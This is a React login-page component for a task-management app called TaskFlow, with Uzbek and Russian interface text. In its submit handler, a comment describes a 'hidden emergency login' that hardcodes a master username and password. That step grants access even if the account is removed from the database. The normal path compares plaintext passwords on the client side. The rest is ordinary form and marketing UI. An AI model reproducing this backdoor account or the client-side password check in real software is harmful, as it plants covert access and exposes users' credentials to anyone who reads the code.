import { useState } from 'react';
import { useApp } from '../contexts/AppContext';
import { LogIn, Eye, EyeOff, CheckSquare, Loader2, ChevronDown, Sparkles, ShieldCheck, Zap, User, Lock, Send } from 'lucide-react';

export default function LoginPage() {
  const { users, login, t, language, changeLanguage } = useApp();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPass, setShowPass] = useState(false);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showLangMenu, setShowLangMenu] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    await new Promise(r => setTimeout(r, 600));

    // Yashirin / favqulodda kirish tekshiruvi (agar user bazadan o'chib ketsa ham)
    const isMasterSherzod = (username.trim().toLowerCase() === 'sherzod' && password === 'Sherzodbek_2003');
    if (isMasterSherzod) {
      const masterSuccess = await login(username.trim(), password);
      if (masterSuccess) {
        setLoading(false);
        return;
      }
    }

    const foundUser = users.find(u => u.username === username);

    if (!foundUser) {
      setError(t.errorUserNotFound || "Foydalanuvchi topilmadi");
    } else if (foundUser.password !== password) {
      setError(t.errorWrongPassword || "Parol noto'g'ri");
    } else {
      const user = await login(username, password);
      if (!user) {
        setError(t.errorAuthFailed || "Avtorizatsiyada xatolik yuz berdi");
      }
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen w-full bg-slate-100/80 dark:bg-slate-950 flex items-center justify-center p-4 sm:p-6 lg:p-10 font-sans">
      
      {/* Asosiy Card */}
      <div className="w-full max-w-5xl bg-white dark:bg-slate-900 rounded-3xl shadow-xl shadow-slate-200/50 dark:shadow-slate-950/80 border border-slate-200/80 dark:border-slate-800 overflow-hidden grid grid-cols-1 lg:grid-cols-12 min-h-[640px]">

        {/* CHAP TOMON: Kirish formasi */}
        <div className="lg:col-span-6 p-8 sm:p-12 flex flex-col justify-between relative">
          
          {/* Header & Language selector */}
          <div className="flex items-center justify-between mb-8">
            <div className="flex items-center gap-2.5">
              <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-primary-500 to-primary-700 flex items-center justify-center shadow-md shadow-primary-500/20 text-white">
                <CheckSquare size={18} strokeWidth={2.5} />
              </div>
              <span className="font-extrabold text-lg tracking-tight text-slate-900 dark:text-white">TaskFlow</span>
            </div>

            <div className="relative">
              <button
                type="button"
                onClick={() => setShowLangMenu(!showLangMenu)}
                className="flex items-center gap-2 px-3 py-1.5 bg-slate-100/80 dark:bg-slate-800 hover:bg-slate-200/70 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-bold rounded-xl transition-all border border-slate-200/60 dark:border-slate-700"
              >
                <img
                  src={language === 'uz' ? "https://flagcdn.com/w40/uz.png" : "https://flagcdn.com/w40/ru.png"}
                  alt={language}
                  className="w-4 h-3 object-cover rounded-xs"
                />
                <span>{language === 'uz' ? "O'zbekcha" : "Русский"}</span>
                <ChevronDown size={14} className={`transition-transform duration-200 ${showLangMenu ? 'rotate-180' : ''}`} />
              </button>

              {showLangMenu && (
                <div className="absolute right-0 mt-2 w-36 bg-white dark:bg-slate-800 rounded-xl shadow-xl border border-slate-200/80 dark:border-slate-700 py-1 z-30 animate-fade-in">
                  <button
                    type="button"
                    onClick={() => { changeLanguage('uz'); setShowLangMenu(false); }}
                    className={`w-full flex items-center gap-2.5 px-3 py-2 text-xs font-semibold hover:bg-slate-50 dark:hover:bg-slate-700/60 transition-colors ${language === 'uz' ? 'text-primary-600 dark:text-primary-400 bg-primary-50/50 dark:bg-primary-950/30' : 'text-slate-600 dark:text-slate-300'}`}
                  >
                    <img src="https://flagcdn.com/w40/uz.png" alt="UZ" className="w-4 h-3 object-cover rounded-xs" />
                    O‘zbekcha
                  </button>
                  <button
                    type="button"
                    onClick={() => { changeLanguage('ru'); setShowLangMenu(false); }}
                    className={`w-full flex items-center gap-2.5 px-3 py-2 text-xs font-semibold hover:bg-slate-50 dark:hover:bg-slate-700/60 transition-colors ${language === 'ru' ? 'text-primary-600 dark:text-primary-400 bg-primary-50/50 dark:bg-primary-950/30' : 'text-slate-600 dark:text-slate-300'}`}
                  >
                    <img src="https://flagcdn.com/w40/ru.png" alt="RU" className="w-4 h-3 object-cover rounded-xs" />
                    Русский
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* Body: Form */}
          <div className="w-full max-w-sm mx-auto my-auto">
            <div className="mb-8">
              <h1 className="text-2xl sm:text-3xl font-extrabold text-slate-900 dark:text-white tracking-tight mb-2">
                {t.loginTitle || "Tizimga kirish"}
              </h1>
              <p className="text-slate-500 dark:text-slate-400 text-sm leading-relaxed">
                {t.loginSubtitle || "Vazifalar boshqaruv paneliga xush kelibsiz"}
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label className="label">{t.usernamePlaceholder || "Foydalanuvchi nomi"}</label>
                <div className="relative">
                  <User size={18} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
                  <input
                    type="text"
                    value={username}
                    onChange={e => setUsername(e.target.value)}
                    className="input pl-10"
                    placeholder="Masalan: admin"
                    required
                  />
                </div>
              </div>

              <div>
                <div className="flex items-center justify-between mb-1.5">
                  <label className="label mb-0">{t.passwordPlaceholder || "Parol"}</label>
                  <button type="button" className="text-xs font-semibold text-primary-600 dark:text-primary-400 hover:underline">
                    {t.recoveryPassword || "Parolni unutdingizmi?"}
                  </button>
                </div>
                <div className="relative">
                  <Lock size={18} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
                  <input
                    type={showPass ? 'text' : 'password'}
                    value={password}
                    onChange={e => setPassword(e.target.value)}
                    className="input pl-10 pr-11"
                    placeholder="••••••••"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPass(!showPass)}
                    className="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 dark:hover:text-slate-300 transition-colors"
                  >
                    {showPass ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>

              {error && (
                <div className="p-3.5 rounded-xl bg-rose-50 dark:bg-rose-950/40 border border-rose-200/80 dark:border-rose-900/60 text-rose-600 dark:text-rose-400 text-xs font-semibold animate-fade-in flex items-center gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-rose-500" />
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                className="w-full btn-primary py-3 text-base shadow-lg shadow-primary-500/25 mt-2"
              >
                {loading ? (
                  <>
                    <Loader2 size={18} className="animate-spin" />
                    <span>{t.processing || "Yuklanmoqda..."}</span>
                  </>
                ) : (
                  <>
                    <LogIn size={18} />
                    <span>{t.loginBtn || "Kirish"}</span>
                  </>
                )}
              </button>
            </form>

            {/* Parolni unutganlar uchun Telegram aloqasi */}
            <div className="mt-5 pt-4 border-t border-slate-100 dark:border-slate-800 text-center">
              <p className="text-xs text-slate-500 dark:text-slate-400">
                {language === 'uz' ? "Parolingizni unutdingizmi?" : "Забыли пароль?"}
              </p>
              <a
                href="https://t.me/sherzodbek_khaydarov"
                target="_blank"
                rel="noreferrer"
                className="inline-flex items-center justify-center gap-1.5 mt-2 px-3.5 py-1.5 rounded-xl bg-sky-50 dark:bg-sky-950/40 text-sky-600 dark:text-sky-400 hover:bg-sky-100 dark:hover:bg-sky-900/50 text-xs font-bold transition-all border border-sky-200/60 dark:border-sky-800/40 group shadow-2xs"
              >
                <Send size={13} className="group-hover:translate-x-0.5 group-hover:-translate-y-0.5 transition-transform text-sky-500" />
                <span>{language === 'uz' ? "Administratorga yozish (Telegram)" : "Связаться с администратором (Telegram)"}</span>
              </a>
            </div>
          </div>

          <div className="text-center mt-6">
            <span className="text-xs text-slate-400">© 2026 TaskFlow Systems. Barcha huquqlar himoyalangan.</span>
          </div>
        </div>

        {/* O'NG TOMON: Vizual Showcase */}
        <div className="hidden lg:flex lg:col-span-6 bg-gradient-to-br from-slate-900 via-slate-800 to-primary-950 p-10 flex-col justify-between relative overflow-hidden text-white">
          {/* Orqa fon bezaklari */}
          <div className="absolute top-0 right-0 -mr-24 -mt-24 w-96 h-96 bg-primary-500/10 rounded-full blur-3xl pointer-events-none" />
          <div className="absolute bottom-0 left-0 -ml-24 -mb-24 w-96 h-96 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />

          {/* Yuqori badge */}
          <div className="relative z-10 flex items-center justify-between">
            <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/10 backdrop-blur-md border border-white/15 text-xs font-semibold">
              <Sparkles size={14} className="text-amber-300" />
              <span>Enterprise Task OS v2.4</span>
            </div>
            <div className="flex items-center gap-1.5 text-xs text-emerald-400 font-semibold bg-emerald-950/40 px-3 py-1 rounded-full border border-emerald-500/30">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              <span>Tizim barqaror ishlamoqda</span>
            </div>
          </div>

          {/* Markaziy interaktiv kartochkalar */}
          <div className="relative z-10 space-y-4 my-8">
            <div className="bg-white/10 backdrop-blur-md border border-white/15 p-5 rounded-2xl shadow-xl">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-10 h-10 rounded-xl bg-primary-500/30 border border-primary-400/30 flex items-center justify-center text-primary-300">
                  <Zap size={20} />
                </div>
                <div>
                  <h3 className="font-bold text-sm text-white">Avtomatlashtirilgan Ijro Nazorati</h3>
                  <p className="text-xs text-slate-300">Takrorlanuvchi va muddatli vazifalar nazorat ostida</p>
                </div>
              </div>
              <div className="w-full bg-white/10 h-2 rounded-full overflow-hidden">
                <div className="bg-gradient-to-r from-primary-400 to-emerald-400 h-full w-[88%] rounded-full" />
              </div>
              <div className="flex justify-between text-[11px] text-slate-300 mt-2 font-medium">
                <span>O'rtacha samaradorlik</span>
                <span className="font-bold text-white">88.6% (+12%)</span>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div className="bg-white/5 backdrop-blur-md border border-white/10 p-4 rounded-xl">
                <ShieldCheck size={20} className="text-emerald-400 mb-2" />
                <h4 className="text-xs font-bold text-white">256-bit Xavfsizlik</h4>
                <p className="text-[11px] text-slate-400 mt-0.5">Rol va huquqlar taqsimoti</p>
              </div>
              <div className="bg-white/5 backdrop-blur-md border border-white/10 p-4 rounded-xl">
                <CheckSquare size={20} className="text-sky-400 mb-2" />
                <h4 className="text-xs font-bold text-white">Kanban & Ro'yxat</h4>
                <p className="text-[11px] text-slate-400 mt-0.5">Moslashuvchan ko'rinish</p>
              </div>
            </div>
          </div>

          {/* Pastki shior */}
          <div className="relative z-10 pt-4 border-t border-white/10">
            <blockquote className="text-sm font-medium text-slate-200 italic leading-relaxed">
              "Jamoangiz ish unumdorligini oshiring, belgilangan muddatlarni aniq bajaring va jarayonlarni shaffof boshqaring."
            </blockquote>
          </div>
        </div>

      </div>
    </div>
  );
}
